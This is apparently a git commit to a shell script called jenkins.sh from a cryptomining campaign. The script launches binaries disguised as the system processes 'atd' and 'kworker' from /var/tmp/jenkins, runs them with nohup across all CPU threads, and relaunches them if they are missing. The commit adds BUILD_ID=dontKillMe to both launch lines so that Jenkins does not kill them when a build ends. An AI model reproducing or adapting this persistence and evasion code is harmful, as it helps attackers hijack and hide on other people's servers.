74fbce43fa4c1b68af6c52eef04e5a234928e119
jokerminer <34443698+attackjoker11@users.noreply.github.com>
2018-01-29 17:04:54 +0530

    Update jenkins.sh

--- jenkins.sh
+++ jenkins.sh
@@ -4,9 +4,9 @@ thread=$(lscpu | grep 'CPU(s)' | grep -v ',' | awk '{print $2}' | head -n 1)
 chmod +x /var/tmp/jenkins/atd && chmod +x /var/tmp/jenkins/kworker
 echo $count
 if [ $count -lt 1 ]; then
-cd /var/tmp/jenkins && nohup ./atd -c honvbsasbf.conf -t $thread -B &
+cd /var/tmp/jenkins && BUILD_ID=dontKillMe nohup ./atd -c honvbsasbf.conf -t $thread -B &
 fi
 doublecount=$(ps -ef | grep -v grep | grep atd | grep conf| wc -l)
 if [ $doublecount -lt 1 ]; then
-cd /var/tmp/jenkins && nohup ./kworker -c config.json -B &
+cd /var/tmp/jenkins && BUILD_ID=dontKillMe nohup ./kworker -c config.json -B &
 fi
